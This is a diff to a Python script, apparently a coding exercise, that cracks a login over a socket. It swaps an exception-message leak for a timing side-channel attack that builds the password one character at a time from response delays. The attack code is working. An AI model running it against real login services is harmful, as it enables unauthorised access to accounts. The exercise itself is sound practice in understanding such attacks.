@@ -5,7 +5,7 @@ import socket
 import argparse
 import string
 import random
-
+import time
 
 DESCRIPTION = 'Connects to an unprotected admin website '
 alpha_digit = list(''.join((string.ascii_lowercase, string.digits, string.ascii_uppercase)))
@@ -44,25 +44,20 @@ class SocketHandler:
                     server_response = json.loads(client.recv(1024).decode('utf-8'))
                     if server_response.get('result') == "Wrong password!":
                         break
+                cracked_password = ''
                 while True:
-                    initial_check = random.choice(alpha_digit)
-                    client.sendall(json.dumps({"login": login,
-                                               "password": initial_check}).encode('utf-8'))
-                    server_res = json.loads(client.recv(1024).decode('utf-8'))
-                    if server_res.get("result") == "Exception happened during login":
-                        break
-                cracked_password = initial_check
-                while True:
-                    random_digit = random.choice(alpha_digit)
+                    random_char = random.choice(alpha_digit)
+                    start_time = time.perf_counter()
                     client.sendall(json.dumps(({"login": login,
-                                                "password": cracked_password + random_digit})).encode('utf-8'))
-                    response = json.loads(client.recv(1024).decode())
-                    if response.get('result') == "Connection success!":
+                                                "password": cracked_password + random_char})).encode('utf-8'))
+                    response = json.loads(json.dumps(client.recv(1024).decode('utf-8')))
+                    end_time = time.perf_counter()
+                    if (end_time - start_time) > 0.1:
+                        cracked_password += random_char
+                    elif json.loads(response)['result'] == "Connection success!":
                         print(json.dumps({"login": login,
-                                          "password": cracked_password + random_digit}))
+                                         "password": cracked_password + random_char}))
                         break
-                    elif response.get('result') == "Exception happened during login":
-                        cracked_password += random_digit
 
     def load_file(self):
         current_path = os.path.dirname(os.path.abspath(__file__))
